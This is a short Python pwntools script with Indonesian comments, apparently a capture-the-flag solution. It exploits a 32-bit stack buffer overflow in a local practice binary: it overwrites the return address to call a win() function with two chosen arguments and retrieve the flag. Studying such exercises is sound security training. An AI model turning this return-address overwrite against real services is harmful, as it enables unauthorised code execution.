from pwn import *

# Jalankan binary
#p = process('./chall')
p = remote('127.0.0.1',4006)
print(p.recv())
# Alamat fungsi win (bisa ditemukan dengan gdb atau objdump)
win_address = p32(0x080491c6)  # Misalnya alamat win()

# Nilai parameter yang diperlukan
param1 = p32(0xdeadbeef)
param2 = p32(0xcafebabe)

# Membuat payload
payload = b"A" * 76  # Isi buffer hingga return address
payload += win_address  # Overwrite return address dengan alamat win()
payload += p32(0x0)  # Mengisi RBP yang lama
payload += param1  # Argumen pertama untuk win()
payload += param2  # Argumen kedua untuk win()
# Kirim payload
p.sendline(payload)
# Interaksi untuk mendapatkan FLAG
print(p.clean())
p.interactive()
